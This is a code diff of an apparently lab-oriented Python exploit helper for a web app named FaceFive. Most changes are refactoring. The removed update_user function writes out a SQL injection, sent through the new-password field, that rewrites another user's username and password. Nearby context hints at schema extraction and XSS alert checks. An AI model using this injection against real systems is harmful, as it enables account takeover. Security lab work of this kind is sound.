@@ -10,6 +10,8 @@ import requests
 import html2text
 _html2text = html2text.HTML2Text()
 
+def preety_print_html(html: str):
+    print(_html2text.handle(html))
 
 class FaceFiveSession:
     def __init__(self, url: str):
@@ -118,30 +120,6 @@ def get_schema(session: FaceFiveSession, tables: str):
 
     return schema
 
-def update_user(session: FaceFiveSession, correct_password: str, username: str, password = None, about = None, name = None, photo = None):
-    sqli = '\', username=\'{}\''.format(username)
-    if password is not None: sqli += ', password=\'{}\''.format(password)
-    if about is not None: sqli += ', about=\'{}\''.format(about)
-    if name is not None: sqli += ', name=\'{}\''.format(name)
-    if photo is not None: sqli += ', photo=\'{}\''.format(photo)
-
-    assert sqli != '\', username=\'{}\''.format(username), 'Need some element to inject'
-    sqli += ' where username=\'{}\' -- '.format(username)
-    print(sqli)
-
-    files = {
-        'name': (None, ''),
-        'currentpassword': (None, correct_password),
-        'newpassword': (None, sqli),
-        'about': (None, 'None'),
-        'image': ('', ''),
-    }
-    r = session.post('update_profile', files=files)
-    preety_print_html(r.text)
-    assert r.status_code == 200, 'Failed to update password: ' + r.reason
-
-    return r
-
 def edit_post(session: FaceFiveSession, identifier: int, content: str, postType="Public"):
     assert len(content) != 0, 'Content cannot be empty'
     print(content)
@@ -157,15 +135,11 @@ def edit_post(session: FaceFiveSession, identifier: int, content: str, postType=
 
     return r
 
-def preety_print_html(html: str):
-    print(_html2text.handle(html))
-
-
 def start_driver():
     chrome_options = Options()
     chrome_options.add_argument("--headless")
     chrome_options.add_argument("--no-sandbox")
-    driver = webdriver.Chrome('./chromedriver')
+    driver = webdriver.Chrome()
     driver.set_page_load_timeout(5)
     driver.set_script_timeout(5)
 
@@ -193,7 +167,7 @@ def create_post_script(session: FaceFiveSession, content: str):
         element.clear()
         element.send_keys(content)
         element = driver.find_element_by_tag_name("button").click()
-        
+
         alert = driver.switch_to_alert()
         text = alert.text
         alert.accept()
@@ -205,7 +179,7 @@ def create_post_script(session: FaceFiveSession, content: str):
         raise e
     except Exception as e:
         raise e
-    finally: 
+    finally:
        driver.close()
 
 def update_user_script(session: FaceFiveSession, correct_password: str, username: str, new_password = None, about = None, name = None, photo = None):
@@ -224,7 +198,7 @@ def update_user_script(session: FaceFiveSession, correct_password: str, username
             element.send_keys(name)
 
         if new_password is not None:
-            element = driver.find_element_by_id("newPasswordInput")
+            element = driver.find_element_by_id("newpasswordInput")
             element.clear()
             element.send_keys(new_password)
 
@@ -232,18 +206,18 @@ def update_user_script(session: FaceFiveSession, correct_password: str, username
             element = driver.find_element_by_id("aboutInput")
             element.clear()
             element.send_keys(about)
-        
+
         element = driver.find_element_by_id("currentpasswordInput")
         element.clear()
         element.send_keys(correct_password)
-    
+
         element = driver.find_element_by_tag_name("button").click()
     except TimeoutException as e:
         print("Could not connect to %s" % session.url)
         raise e
     except Exception as e:
         raise e
-    finally: 
+    finally:
         driver.close()
 
 def send_friend_request(session: FaceFiveSession, friend_username: str):
